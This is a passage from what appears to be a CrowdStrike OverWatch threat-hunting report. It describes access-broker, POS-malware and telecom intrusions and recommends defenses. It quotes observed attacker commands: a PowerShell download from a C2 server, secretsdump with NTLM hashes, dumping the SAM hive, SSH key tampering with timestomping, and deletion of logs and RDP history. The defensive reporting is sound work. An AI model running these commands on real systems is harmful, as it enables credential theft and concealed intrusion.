money mules, it takes multiple criminal actors fulfilling a wide\nrange of functions to facilitate a successful ransomware attack. Over the past\n\n###### INTRUSION\n\nyear, access brokers carved out a unique role in today’s multifaceted eCrime\n\n#### F\n\necosystem. One prolific suspected access broker over the past year is an adversary\n\n###### ACTIVITY\n\ntracked by CrowdStrike Intelligence as PROPHET SPIDER.\n\n###### IN-DEPTH Access brokers specialize in breaching networks with the intention of selling that\n\naccess to others. Their customers use the access to launch their own campaigns,\n\nThe stories and analysis\n\nwhich increasingly involve the deployment of ransomware. Threat hunters can cut short\n\nthat follow provide a window\n\nthis eCrime supply chain by finding and disrupting access brokers as they attempt to\n\ninto the interactive intrusion\n\ngain a foothold in a network.\n\nactivity that OverWatch\nuncovers daily. This cross PROPHET SPIDER has earned a reputation for gaining initial access by compromising\nsection of eCrime and vulnerable web servers. This eCrime adversary typically targets Oracle WebLogic\ntargeted intrusion activity has servers and has been observed exploiting CVE-2016-0545, CVE-2020-14882 and\nbeen selected to provide a CVE-2020-14750, but CrowdStrike has also observed this actor targeting other\ncloser look at how some of web servers. To enable persistence, PROPHET SPIDER often deploys a variety of\nthe intrusion trends from the backdoors and reverse shell tools, such as GOTROJ, that connect to hard-coded\npast year have played out in command and control (C2) IP addresses. Securing redundant access to these\nthe wild. compromised networks is likely an attempt by access brokers to increase the value of\n\nthe product they are selling.\n\nOverWatch threat hunters uncovered multiple attempted PROPHET SPIDER intrusions\nspanning several industry verticals. One particular intrusion against a technology\ncompany featured many typical PROPHET SPIDER tactics and techniques. By\nunderstanding these behaviors, defenders can better equip themselves with the\nknowledge needed to rapidly disrupt access brokers before they can use any access\nfor malicious intent.\n\n\n###### INITIAL ACCESS DISCOVERY COMMAND & CONTROL DISCOVERY\nA vulnerable The adversary used a The adversary used Finally, the adversary\nWebLogic server cmd shell to perform PowerShell and wget searched for open\nwas compromised various preliminary for ingress tool SMB ports using a\n\ndiscovery commands transfer scanning tool, in\n\nlikely preparation for\nlateral movement\n\n\n-----\n\nOverWatch recently uncovered evidence of a Windows-based WebLogic server\ncompromise on a technology company’s network. Threat hunters were alerted to a\npotential unwanted intruder when a discovery command, in this case whoami, was\nseen running under a java.exe process (shown in the image below). Adversaries\ncommonly run discovery commands early in an intrusion as they attempt to get their\nbearings in a new environment.\n\nWININIT.EXE\n\n– +\n\nSERVICES.EXE\n\n– +\n\n...-3.2.3RSA4.EXE\n\n–\n\nJAVA.EXE\nCMD.EXE\n\n–\n–\n\nWHOAMI.EXE\n\nCONHOST.EXE\n\nCONHOST.EXE\n\n**Figure 7. Process tree showing a suspicious whoami command running under a java.exe process**\n\nOverWatch notified the customer and continued tracking the adversary as they\nproceeded to explore the environment for clues to help them deepen their foothold.\nThe adversary attempted discovery of system network configuration,[16] files and\ndirectories,[17] running processes[18] and domain trusts.[19] They then proceeded to\nretrieve and install tools to help them establish persistence and expand their foothold.\nOverWatch updated the victim organization about the malicious behavior as it\nunfolded, equipping the organization's team with the details necessary to prevent\nPROPHET SPIDER from handing off access to another adversary that would likely\nhave deployed ransomware.\n\n16 https://attack.mitre.org/techniques/T1016/001/\n17 https://attack.mitre.org/techniques/T1083/\n18 https://attack.mitre.org/techniques/T1057/\n19 https://attack.mitre.org/techniques/T1482/\n\n\n-----\n\n**Why attackers use it: Sometimes adversaries cannot rely solely on native tooling**\nto expand their foothold or complete their intrusion. It may be necessary (or simply\nmore convenient) to access additional tools. While adversaries may use this technique\nto install malware, it is not uncommon to observe them transferring otherwise\nlegitimate tools into a victim environment. Transferring legitimate utilities can expand\nan adversary’s tool set without necessarily triggering security software detection.\nFurther, tool transfers may go undetected in cases where defenders don’t routinely\nand continuously monitor for unexpected file transfers, uncommon data flows or\nunusual external network connections that result in file creation.\n\n**What threat hunting delivers: Threat hunting is crucial for ensuring that adversaries**\nare unable to transfer files into a victim network unnoticed. In this intrusion attempt,\nPROPHET SPIDER first used PowerShell to retrieve a copy of a Windows version of\nthe wget utility. Then, using wget, they downloaded a web shell and a low-prevalence\nscanning tool. OverWatch threat hunters caught this activity by proactively hunting\nfor unexpected processes retrieving files from external servers. OverWatch routinely\npays close attention to the presence of legitimate tools that eCrime adversaries are\nknown to use.\n\n###### Why Windows When You Can Linux?\n\nThe behavior that OverWatch observed next revealed PROPHET SPIDER’s style and\npreferences. The adversary executed the following PowerShell command to retrieve\nand install a binary file:\n\npowershell -Command (New-Object\nSystem.Net.WebClient).DownloadFile(:443/wget.bin',\n'C:\\Windows\\temp\\wget.bin')\n\nFurther analysis confirmed that this file from their external C2 server was a\nlegitimate PE file version of the wget utility for use on Windows. This is a common\napproach OverWatch has observed PROPHET SPIDER take when operating in\nWindows environments. Typically, the servers they compromise for initial access\nare Linux-based, so a repeated use of wget on Windows machines suggests their\npreference and comfort using traditional Linux tooling when possible.\n\n20   https://attack.mitre.org/techniques/T1105/\n\n\n-----\n\nAfter installing wget.bin, the adversary immediately used it for additional ingress\ntool transfer. They proceeded to install a copy of 7zip:\n\nc:\\windows\\temp\\7fde\\wget.bin -t 1 :443/7z.bin -O\nc:\\windows\\temp\\7fde\\7z.bin\n\nThey also used wget to retrieve a web shell with a file name of pia.jsp. Another tool\nthey installed was their scanner of choice, a simple low-prevalence network scanning\ntool often named pscan. The tool scans a range of IP addresses for one specific port.\nCrowdStrike has observed it in both PE and ELF versions, which is consistent with\nPROPHET SPIDER’s focus on targeting both Linux and Windows servers. In this case,\nthey used pscan to scan the network for openings on port 445 (SMB), likely in hopes\nof moving laterally.\n\n###### Conclusion and Recommendations\n\nThanks to OverWatch threat hunters’ rapid discovery of the activity, the customer\nreceived the necessary information to cut off the adversary’s access, preventing\nPROPHET SPIDER from using this network as its next resale opportunity for\nransomware operators.\n\nInterestingly, the adversary returned one month later to the same server and attempted\nto perform similar TTPs. Such perseverance illustrates the determination of eCrime\nadversaries as they continue to mature and specialize in various functions of the eCrime\necosystem. It is an unfortunate fact that intrusions are rarely a one-off event.[21]\n\nThe best defense against opportunistic attacks by access brokers is to ensure your\nexternally facing servers are fully patched. However, preventative measures are not\na silver bullet. Adversaries may be able to bypass even robust and secure perimeters\nusing a variety of techniques. Therefore, proactive threat hunting like what\nOverWatch provides is also essential. When threat hunters are effectively scouring\nyour network for even the most subtle clues of a potential adversary presence, they\ncan quickly home in on unusual behaviors, such as the living-off-the-land discovery\nactions that PROPHET SPIDER used early in this intrusion.\n\nIn addition to hunting for unexpected reconnaissance, defenders should also monitor\ntheir environment for potentially malicious ingress tool transfer. To do this effectively,\ndefenders must continually monitor for unexpected processes retrieving files from\nexternal servers as well as uncommon network data flows. Defenders should also hunt\nfor legitimate tools that eCrime adversaries like to use. Antivirus products typically\nwill not block these tools because of their common and legitimate usage, but they can\nserve as a valuable lead in revealing an unwelcome user on your network.\n\n21   Of those organizations that engaged CrowdStrike incident response services and went on to engage\nFalcon Complete™ managed detection and response (MDR), 68% were targeted within the following 12\nmonths by another sophisticated intrusion attempt, which was thwarted by Falcon Complete.

Following instructions from the caller, the employee\n\n#### I\n\ndownloaded the legitimate remote access tool TeamViewer to all hosts at the store.\n\nAs happens all too often, the employee unwittingly gave an unknown adversary access\nto remotely administer the store’s systems.\n\n\n###### OverWatch detected the  low-prevalence binary, lateral movement and persistence, and alerted the victim organization.\n\n\nThe adversary used TeamViewer to access several hosts and write likely Prilex POS\nmalware as well as Ammyy Admin remote access software. The Prilex malware,\nprimarily seen in eCrime motivated intrusions, installed additional malicious binaries,\nestablished C2 via a remote domain, excluded itself from Windows Defender scans and\ncreated persistence via registry run keys[22] and scheduled tasks.[23]\n\nAlthough the activity was initiated from a valid account and legitimate remote access\nsoftware, OverWatch detected the low-prevalence binary, lateral movement and\npersistence, and alerted the victim organization.\n\n###### INITIAL ACCESS EXECUTION PERSISTENCE DEFENSE EVASION\nThe adversary The user unwittingly The Prilex malware The Prilex malware hid\nconducted executed legitimate attempted to achieve directories containing\nspearphishing via a remote access persistence using malicious binaries and\ntelephone call software configured registry run keys and also attempted to\n\nfor adversary C2 scheduled tasks exclude those\n\nmasqueraded as directories from\noperating system Windows Defender\nfunctions scans\n\n\n###### From User-enabled Access to Attempted Persistence and Collection\n\nAfter installing TeamViewer, the adversary deployed their tooling to the compromised\nhosts. The tooling included the remote administration software Ammyy Admin, an\ninstaller for the POS malware Prilex, and a batch script named v.bat. The Prilex\ninstaller was written to C:\\Temp\\Gh.exe and executed.\n\n22   https://attack.mitre.org/techniques/T1547/001/\n23   https://attack.mitre.org/techniques/T1053/005/\n\n\n-----\n\nGh.exe is a self-extracting RAR archive (SFX) that writes three binaries to disk:\n\n- C:\\Intel\\Drv\\Microsoft0leSystemmcas.exe\n\n- C:\\Intel\\Drv\\winlog0nUser.exe\n\n- C:\\Temp\\Cabs\\sndcab.exe\n\nThe SFX runs a batch script named new.bat, which establishes persistence for these\nbinaries by scheduling individual tasks to execute each binary at system startup. Each\ncreated task uses a name that masquerades[24] as an update service:\n\n- MicrosoftWindowsUpdateTool\n\n- MicrosoftUptadeTool (sic)\n\n- MicrosoftWindowsEdgeUpdateTool\n\nAdditionally, new.bat attempts to establish persistence by adding entries to the\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key for each binary,\nand uses the attrib command to set the +h (hidden) and +s (system) properties for\nC:\\Intel\\Drv and C:\\Temp\\Cabs.\n\nv.bat uses PowerShell’s Set-MpPreference command to add exclusions to\nWindows Defender for C:\\Temp and C:\\Intel to attempt to prevent Defender from\nscanning directories containing Prilex binaries.\n\n###### PHISHING/SPEARPHISHING VIA SERVICE (E.G., “VISHING”) [25]\n\n**How this technique works: An adversary intent on targeting a specific victim may**\nseek the cooperation of valid users through deception and social engineering\ndelivered outside enterprise email channels. By researching the target in advance,\nthe adversary may learn which communication methods are available or likely to\nsucceed, and organization-specific details that can be useful in crafting a convincing\nmessage. When adversaries employ spoken communications, these voice phishing\nattempts are referred to as “vishing.”\n\n**Why attackers use it: Enterprise security solutions have rightly focused on the email**\nphishing threat, increasing the difficulty of successful compromise. Adversaries\nmay bypass these hurdles by avoiding enterprise email altogether and attempting\nto manipulate users through other communication channels that are less frequently\nmonitored, if at all.\n\n**What threat hunting delivers: Because these phishing attempts avoid the process**\nprovenance of enterprise email applications, automated detections focused solely\non that point of origin are insufficient. Initial access may begin with a valid user\nintentionally downloading and executing a legitimate application, as was the case in\nthe SPIDER vishing attack described above. Effective threat hunting looks for valid\naccounts carrying out successive phases of an intrusion, such as C2, persistence\nand lateral movement.\n\n24 https://attack.mitre.org/techniques/T1036/004/\n\n\n-----\n\n###### Following the Footprints for Detection and Response\n\nThere are numerous techniques adversaries can use to compromise valid accounts\nand leverage them for malicious use. Some techniques, such as spearphishing\nattachments[26] and password spraying,[27] create predictable telemetry patterns that\nare relatively easy to identify. Others, such as user execution of remote access tools\nor divulging of credentials through a fake login portal, are harder to detect. While\nuser education is an essential part of countering this threat, defenders must be able\nto detect the inevitable compromises and the intrusions that follow.\n\nFor an adversary, gaining execution in the target environment is only a first step\ntoward their objective. As the adversary continues to advance, each step becomes\nan opportunity for threat hunters to identify the telltale footprints of an intruder.\n\nIn this intrusion, threat hunters found their first clue when the adversary wrote both\nlow-prevalence and known suspicious tools to the host. By using CrowdStrike Threat\nGraph to correlate the same indicators from the same account across multiple\nhosts, a picture of potential lateral movement began to take shape.\n\nAt this stage, however, the adversary’s first footprints might be explained away as a\nsystem administrator using remote access software to deploy internally developed\nsoftware (which would explain the novel hash signatures).\n\nThe adversary tipped their hand when they attempted to establish persistence and\ntook measures to avoid detection and defenses. It is true that legitimate software\nmay hide installation directories to obscure complexity or prevent accidental user\ntampering. However, when stealthy or evasive measures are observed in combination\nwith the preceding activity, they add further suspicion in the mind of a threat hunter.\n\nIn this intrusion, the threat hunter’s suspicions were confirmed by more egregious\nattempts to blend in with scheduled task names that masquerade as valid operating\nsystem functions. Finally, excluding Prilex malware directories from Windows Defender\nscans confirms the intent for long-term collection operations without interruption.\n\n###### Conclusion and Recommendations\n\nUser-enabled intrusions allow an adversary to bypass some tactics in the MITRE\nATT&CK Matrix. This, however, should not worry diligent threat hunters equipped\nwith sufficient telemetry and an understanding of both the steps required for\nadversary objectives and the footprints that those steps leave behind. The key is\nto inhibit adversary progress through effective EDR while putting the indicators\ntogether to recognize the threat and respond to it in a timely manner.\n\nThe use of legitimate, non-native remote access tools such as TeamViewer,\nAnyDesk or VNC (and its variants) by eCrime actors remains common. In the last\nyear, such tools were present in about 5% of eCrime intrusion attempts observed\nby OverWatch. System administrators would do well to restrict and audit the use of\nsuch tools in their environment, even for authorized use cases. Adversaries have\nbeen known to search for listening ports and stored credentials used by remote\naccess tools to take advantage of preinstalled lateral movement options.\n\n26   https://attack.mitre.org/techniques/T1566/001/\n27   https://attack.mitre.org/techniques/T1110/003/\n\n\n-----\n\n###### SPIDERs at a Glance\n\nECrime actors are prolific and, due to the largely opportunistic nature of their\noperations, found operating across almost every industry vertical. In the year to\nJune 30, 2021, OverWatch uncovered eCrime activity attributed to 13 named eCrime\nadversary groups, and extensive eCrime activity not currently attributed to a specific\nnamed adversary group, such as the activity described in this intrusion story.

This activity\n\n#### O\n\nspanned all major geographic regions and was tied to a diverse range of adversaries.\nThis activity was often conducted by China-nexus adversaries but OverWatch also\nuncovered operations by Iran-nexus adversaries and other unidentified, but likely\ntargeted intrusion adversaries.\n\nTargeted intrusion adversaries often conduct operations against telecommunications\nproviders to fulfill their surveillance, intelligence and counterintelligence collection\npriorities. This includes accessing information such as call detail records (CDR) and,\nin the case of mobile providers, short message service (SMS) communications. In\nsome instances, such as the case study in this section, multiple targeted intrusion\nadversaries have been found active simultaneously, perhaps unbeknownst to each\nother, in the same victim environments.\n\n###### Tradecraft\n\nTelecommunications providers play a unique and critical role in modern societies.\nMost businesses, governments and individuals rely on telecommunications\nproviders to enable all manner of communication. The centrality and ubiquity of\ntelecommunications systems make them high-value targets for governments and\ncriminals worldwide. Targeted intrusion adversaries routinely prove themselves\nadept at learning how these systems function and are skilled at navigating Windows,\nLinux and Solaris environments.\n\nCommon initial access techniques observed in use against the telecommunications\nindustry include spearphishing, vulnerability exploitation, use of legitimate credentials\nand supply chain compromise. Once access has been gained, adversaries often\nexploit services or use system-native tools, such as Windows Management\nInstrumentation (WMI) and various command and script interpreters, to stage the rest\nof their operation.\n\nTo maintain access to a victim environment, adversaries regularly and proactively\nidentify hosts of interest that may create opportunities for credential harvesting and\nlateral movement. In many cases, adversaries explore the environment using built-in\ntools such as the Windows net command, ping, telnet, SSH, PowerShell and WMI,\namong others.\n\n\n-----\n\nOnce a target host is identified, adversaries have a variety of techniques at their\ndisposal to acquire user credentials. In Microsoft environments, common credential\nharvesting techniques include using Mimikatz,[28] dumping LSASS memory (often via\ncomsvcs.dll or using ProcDump), or altering the WDigest registry key to store\npasswords in clear text in memory. In Linux environments, adversaries often view the\ncontents of sensitive files, such as .bash_history, passwd, shadow, and other\nconfiguration files and administration scripts, when attempting to identify credentials.\nOverWatch has also observed adversaries employing more novel techniques. In one\ncase, an adversary deployed backdoored SSH daemons that included an added ability\nto log credentials.[29] OverWatch has also seen the use of backdoored web-based login\npages that have been modified to save credentials for later retrieval by the adversary. In\nseveral instances, operators associated with the LightBasin activity cluster[30] (tracked\nin industry reporting as UNC1945) deployed a pluggable authentication module (PAM)\nbackdoor to log credentials for subsequent exfiltration.\n\nTargeted intrusion adversaries often employ a variety of bespoke and publicly available\ntooling during of their intrusion activity. Web server-based tools, such as Chopper web\nshell and reGeorg tunneling tool, are regularly used as an entry point into compromised\nenvironments. Chopper web shell can also be used to conduct reconnaissance,\ndownload additional tooling and execute commands. Web shells can often be deployed\nin various web server environments due to their simplicity and cross-platform\ncompatibility, allowing them to be written in different languages such as ASP, PHP or\nJSP. Chopper and other similar web shells such as CKnife and AntSword also enable\nadversaries to manage multiple victims from a single interface. This significantly\nreduces the effort required to conduct operations against multiple targets.\n\nChina-nexus adversary WICKED PANDA often uses a variety of remote access tools\nincluding Cobalt Strike and their own custom software such as Winnti, ShadowPad or\nRouterGod to progress their intrusions. The LightBasin cluster has a diverse toolset\nthat includes a tool referred to as sun4me, which has been deployed as an encrypted\npayload using a key derived from the victim's environment and is decrypted by a tool\nreferred to as STEELCORGI. sun4me's wide-ranging features include:\n\n\u0007Tools to enumerate the network via SNMP, UDP and different traceroute\nmechanisms\n\n\u0007WHOIS and DNS query tools\n\n\u0007Exploits for HeartBeat, Java over Remote Method Invocation (RMI), Apache Struts,\nWeblogic, Veritas Veritas NetBackup and others\n\n\u0007Administration interface for MikroTik routers\n\n\u0007Tools to remotely extract the configuration from Cisco routers\n\n\u0007Tools to decrypt passwords from Cisco configuration, vncpasswd and cvspass files\n\n\u0007Tools to monitor activity on the infected host\n\n\u0007Tools to enumerate remote users and brute force their credentials via SSH\n\n\u0007Utility tools such as grep, hexdump, shred, compress and uncompress, and various\nversions of netcat\n\n28 https[:]//github[.]com/gentilkiwi/mimikatz/wiki\n29 For more details, see the description for T1554 - Compromise Client Software Binary in the Adversary\n_Techniques and Tooling Insights section._\n30 The term “LightBasin” describes an activity cluster that has conducted operations against the telecom\nmunications sector since at least 2017. They are skilled at operating in Linux environments.\n\n\n-----\n\nTo capitalize on their access, adversaries must understand the telecommunications\nenvironment in which they operate. Adversaries must know how, when and where\ninformation such as call details and SMS messages are routed and recorded.\nOverWatch has observed adversaries viewing administration scripts and database\nschemas likely as part of their reconnaissance of telecommunications environments.\n\nAn adversary with deep knowledge of a target environment can be difficult to discern\nfrom a legitimate administrator. Experienced threat hunters are vital in helping to\ndifferentiate legitimate administrative activities from those conducted by an adversary.\nOverWatch threat hunters routinely interact with the most prolific and capable\nadversaries targeting the telecommunications industry. This familiarity ensures\nOverWatch hunters have deep insights into adversary behaviors and patterns that\nenable them to rapidly detect, respond to and prevent adversaries from carrying out\ntheir campaigns unseen.\n\n###### Conclusion\n\nTelecommunications organizations not only form part of our critical infrastructure,\nthey are a repository of sensitive and highly valuable data. For these reasons, the\ntelecommunications industry is likely to remain a high-value target. OverWatch has\nobserved adversaries targeting data related to specific persons of interest, in addition\nto conducting wholesale exfiltration of database records, possibly in an effort to mask\ntheir specific target.\n\nDespite widespread publicity via high-profile outings and indictments, state-nexus\nand criminal adversaries are becoming increasingly brazen in their intrusion efforts.\nFrom late 2020 through the first half of 2021, there were frequent high-profile events\nsuch as the supply chain compromise by Russia-nexus activity cluster StellarParticle,\nmass on-premises Microsoft Exchange exploitation by at least eight China-nexus\nadversaries, and Pulse Secure Connect VPN exploitation by KEYHOLE PANDA and\nanother unnamed China-nexus adversary. ECrime actors such as CARBON SPIDER\nand PINCHY SPIDER also regularly conducted high-impact ransomware operations in\nparallel with the aforementioned targeted intrusions.\n\n31 https://front.un-arm.org/wp-content/uploads/2021/06/final-report-2019-2021-gge-1-advance-copy.pdf\n\n\n-----\n\n###### OverWatch Uncovers Double Trouble in the Wires\n\nn the first quarter of 2021, OverWatch unearthed sophisticated intrusion activity\nat a telecommunications entity based in the Middle East, Turkey and Africa\n(META) region. As detailed above, telecommunications organizations have\n\n#### I\n\nlong been targeted by state-nexus adversaries focused on downstream customer\ntargeting and intelligence collection operations. Deeper analysis of the observed\nTTPs revealed that the victim organization was being targeted simultaneously\nby two distinct threat actors. Notably, there appeared to be concurrent targeted\nintrusions and criminally motivated intrusions underway.\n\nThese two threat actors were observed conducting actions on objectives across a\nselection of both Linux- and Windows-based hosts. The tradecraft observed in the\norganization’s Linux environment overlaps with previously observed activity tracked by\nCrowdStrike Intelligence as part of the LightBasin activity cluster. While CrowdStrike\nhas not attributed a specific geographical origin to LightBasin, the activity has\nbeen assessed with moderate confidence as being consistent with targeted\nintrusion operations. In contrast, the activity observed in the organization’s Windows\nenvironment is suspected to have been carried out by an eCrime actor.\n\nIn both environments, OverWatch observed the use of multiple valid accounts,\nincluding the root account on Linux and a kit bag of domain and backdoored local\naccounts on Windows.\n\nIn addition to broad reconnaissance and information collection operations,\nOverWatch identified the deployment of an extensive array of actor tooling. Among\nthese tools were a selection of remote administrative utilities, which suggested that\nestablishing and maintaining multiple methods of persistent remote access to the\nvictim environment was a core mission objective.\n\nBoth actors diligently attempted to evade detection and conceal their operations. In\nparticular, OverWatch routinely observed them operating from hosts without Falcon\nsensor coverage. There is risk when endpoints or other devices are not covered by\nFalcon, and therefore CrowdStrike strongly encourages the widest possible use of\nFalcon sensors throughout the environment.\n\n###### INITIAL ACCESS DISCOVERY COLLECTION\n\n\nUse of a collection\nof valid and\nbackdoored\naccounts on Linux\nand Windows\nhosts\n\n\nHost and user\nreconnaissance\nconducted, including\nenumeration of domain\ngroup and host\ninformation\n\n###### CREDENTIAL ACCESS DEFENSE EVASION\n\n|Col1|Col2|\n|---|---|\n|CESS DISCOVERY COLLECTION ection Host and user Use of unique nd reconnaissance keylogging and screen red conducted, including capture tooling for input n Linux enumeration of domain capture ows group and host information||\n\n\nNumerous credential dumping\nand harvesting techniques\nemployed, inducing sensitive file\nenumeration, use of disguised\nkeyloggers and a distinctive\nscreen capture tool\n\n\nUse of disguised and\nrenamed actor tooling and\nanti-forensic techniques,\nand attempts to weaken\nhost security posture\n\n\n###### LATERAL MOVEMENT\n\nLateral movement\nbetween multiple\nhosts using SSH,\nRDP and WMI\n\n\n-----\n\n###### The Hunt for Sensitive Information\n\nHarvesting and collecting sensitive information, including user credentials, is a\ncommon mission objective observed in targeted intrusion operations against\ntelecommunications entities. The activity observed by OverWatch throughout this\nintrusion attempt serves as a reminder that eCrime adversaries also see value in the\ncollection of such sensitive information, often in support of efforts to broaden their\nreach.\n\nOverWatch observed the likely eCrime actor deploying secretsdump.exe, a publicly\navailable credential dumping tool that they used in an attempt to dump LSA secrets[32]\non a highly sensitive server using the following command:\n\nsecretsdump.exe ./[REDACTED]@[REDACTED] -hashes [HASH]:[HASH]\n\nThis attempt was thwarted by the Falcon sensor, ultimately leaving the actor\nempty-handed. However, the command itself is noteworthy, as it revealed that they\nwere likely in control of another privileged account for which they supplied the\nNTLM hash and attempted to dump credentials on a CyberArk server. Continuing\ntheir determined, albeit unsuccessful attempts to harvest credential information\nfrom various hosts, the actor went on to use reg.exe in an attempt to save off the\nSecurity Account Manager[33] (SAM) registry hive using the below command:\n\nreg save hklm\\sam sam.out\n\nBut once again, the actor’s plans were quashed by the Falcon sensor, which\nprevented the attempted credential dumping. Shifting their attention, they began\nseeking out potentially sensitive files on the host, using notepad.exe to view\nseveral files of interest, including text files likely to contain credential related\ninformation.\n\nC:\\Program Files\\Notepad++\\notepad++.exe\"\n\"\\\\[REDACTED]\\[REDACTED]\\credentials.txt\n\nContinuing with the information collection operations, the actor again caught the\nwatchful eye of OverWatch threat hunters when they were discovered viewing image\nfiles created by a previously identified backdoor that had been deployed on the host.\n\nC:\\PerfLogs\\SmartAudio.exe\n\nCrowdStrike Intelligence’s analysis of the backdoor — identified as a custom\nPyInstaller executable — revealed that the tool included the capability to take a\nscreen capture[34] each time the active foreground window text changed on the victim\nhost. The resulting screen captures were written to %APPDATA% with the file name\n%Y_%m_%d_%H_%M_%S.png. The actor was subsequently identified using\nmspaint.exe to view the screen captures created by the above tool.\n\n\"C:\\Windows\\system32\\mspaint.exe\"\n\"\\\\[REDACTED]\\c$\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED].png\"\n\n32   https://attack.mitre.org/techniques/T1003/004/\n33   https://attack.mitre.org/techniques/T1003/002/\n34   https://attack.mitre.org/techniques/T1113/\n\n\n-----\n\n###### BYO SSH Keys: Persisting Linux Access\n\nLightBasin was observed by OverWatch operating under the root account to\nmove laterally between Linux hosts using SSH. The use of the root account was\nindicative of an actor that was likely already significantly entrenched in the victim\norganization's network. Despite this, the actor continued to take additional steps to\nensure they were able to maintain their access. Notably, OverWatch threat hunters\nobserved LightBasin manipulating the SSH authorized_keys file.[35]\n\nThe abuse of SSH keys is a commonly seen persistence method used to preserve\naccess. In this case, the actor was discovered tampering with the authorized_keys\nfile, likely adding their own malicious SSH keys to the file before overwriting it. Once\nthis operation was complete, the actor used the touch command to timestomp[36] the\nauthorized_keys file, thereby modifying the file’s timestamp.\n\n35 https://attack.mitre.org/techniques/T1098/004/\n36 https://attack.mitre.org/techniques/T1070/006/\n\n\n-----\n\nCommand line examples:\n\nmv oldauthorized_keys authorized_keys\n\ntouch -r /bin/ls authorized_keys\n\n###### Likely eCrime Actor Deploys Arsenal of Remote Administration Tools\n\nThe extensive array of tooling that the eCrime actor deployed serves as a stark\nreminder of the lengths to which criminal actors will go to maintain unfettered\naccess to a victim organization's network. OverWatch identified the actor deploying\na collection of remote administration tools, all of which were written to the common\nstaging directory C:\\PerfLogs. These included the TeamViewer QuickSupport tool,\nCloudBerry Remote Assistant and the Ammyy Admin Remote Desktop software:\n\nC:\\PerfLogs\\AA_v3.exe\n\nC:\\PerfLogs\\TeamViewerQS.exe\n\nC:\\PerfLogs\\RemoteDesktopSetup_v2.4.1.19_netv4.5.1_c5D60E86D.exe\n\n###### Diligence in Maintaining Stealth\n\nBoth threat actors diligently cleared artifacts, concealing their operations while\nconducting actions on objectives. OverWatch also observed the use of at least five\ndistinct defense evasion techniques across both Windows and Linux hosts, aimed\nat ensuring the actors could conduct their operations without catching the eye of\ndefenders.\n\nAdditionally, LightBasin was observed on several occasions operating from hosts\nwithout the Falcon sensor installed. This was significant, as it indicated a high\ndegree of situational awareness with respect to the victim organization’s network\nand deployed security controls. It also suggested to OverWatch threat hunters that\nLightBasin was likely aware of the presence of the Falcon sensor.\n\nAs LightBasin moved laterally between Linux hosts via SSH, they repeatedly\nattempted to tamper with logs in order to remove evidence of their activity. In one\nsuch example, OverWatch threat hunters identified the use of the anti-forensic tool\nLOGBLEACH, an ELF utility used to clear logs and prevent analysis. Execution of the\nfollowing command resulted in the clearing of specific log files using rm -rf.\n\nCommand line example:\n\norcld -yCa\n\nLightBasin actors continued their cleanup efforts, deleting the LOGBLEACH\ntool once they were done, via the command rm -f orcld. They were also seen\nexecuting commands via bash, appended with the HISTFILE=/dev/null string,\nallowing for the execution of commands via Bash without writing command history\nto the .bash_history file.\n\n\n-----\n\nSeparately, OverWatch observed the probable eCrime actor conducting concerted\ndefense evasion efforts across several Windows-based hosts within the victim’s\nenvironment. After moving between hosts using WMI and RDP, the actor attempted\nto conceal their lateral movement by deleting their RDP connection history. Using\nthe following commands, the actor used reg.exe to delete two specific registry\nkeys:\n\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server\nClient\\Default\" /va /f\n\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server\nClient\\Servers\" /f\n\nThe “Default” key stores the history of the most recent 10 RDP connections on the\nhost, while the “Servers” key contains a list of all RDP connections that have been\nmade from the host, including the username that was used to connect.\n\nSimilar to log clearing operations observed on Linux hosts, the actor also attempted\nto delete various Windows logs using the following command:\n\ncmd /c del /f *.log\n\nContinuing the evasive techniques on Windows, among the selection of tooling\ndeployed by the actor were three keyloggers, each of which were named so as to\nmasquerade[37] as a legitimate executable:\n\nC:\\Users\\[REDACTED]\\Documents\\Cloudstrike.exe\n\nC:\\Users\\[REDACTED]\\Documents\\Symantec.exe\n\nC:\\PerfLogs\\Chrome.exe\n\n###### Conclusion and Recommendations\n\nFor the past three years, telecommunications organizations have featured\nprominently in the top five most heavily targeted verticals, as observed by\nOverWatch. They remain a rich target of choice not only for state-nexus actors\nfocused on information collection objectives, but also, as seen here, for criminal\nactors citing the opportunity for large-scale eCrime operations and the potential\nfor a lucrative payoff. Despite concerted efforts to evade the Falcon sensor, the\nactors in this case were unable to escape the watchful eye and continuous vigilance\nprovided by OverWatch’s 24/7/365 human-driven threat hunting operations.\n\nSeveral features of this intrusion would likely cause challenges for defenders reliant\nonly on technology-based controls — in particular, having threat actors deeply\nentrenched in the victim environment, possessing a vast array of compromised\nand privileged accounts, and using collection techniques such as screen capture.\nOverWatch effectively bridged the gap for the victim organization, arming defenders\nwith the vital visibility and timely actionable intelligence that enabled them to take\naction and disrupt the stealthiest of tradecraft.\n\n37 https://attack.mitre.org/techniques/T1036/004/\n\n\n-----\n\nTo combat the abuse of valid accounts, defenders should maintain strict user\nand privileged account management practices including avoiding the use of\ndefault accounts, regularly auditing account permissions, deploying multifactor\nauthentication and employing the concept of least privilege. Defenders should also\navoid storing any sensitive or credential-related information in unencrypted files,\nand consider disabling access to the Windows registry editor to protect against\nmalicious registry modification such as the deletion of registry keys. On Linux hosts,\nauditing of .bash_history can help to surface indications of anomalous activity,\nand defenders may consider modifying sshd_config to restrict SSH access to\nonly privileged users. Finally, the importance of continuous proactive threat hunting\ncannot be overstated, and it should be deployed alongside technology-based\ncontrols to provide defenders with the vital last line of defense against the\nstealthiest of TTPs.\n\n###### TOP TTPs IN TELECOMMUNICATIONS INTRUSIONS\n\nThe following TTPs were observed in more than a quarter of intrusion attempts\nagainst the telecommunications industry uncovered by OverWatch.\n\nTechnique T-Number\n\nValid Accounts T1078\n\nCommand and Scripting Interpreter T1059\n\nMasquerading T1036\n\nIndicator Removal on Host T1070\n\nOS Credential Dumping T1003\n\nRemote System Discovery T1018\n\nAccount Discovery T1087\n\nSystem Owner/User Discovery T1033\n\nSystem Information Discovery T1082\n\nFile and Directory Discovery T1083\n\nProcess Discovery T1057\n\nSystem Network Connections Discovery T1049\n\nSystem Network Configuration Discovery T1016\n\nPermission Groups Discovery T1069\n\nRemote Services T1021\n\nData from Local System T1005\n\n**Table 4.

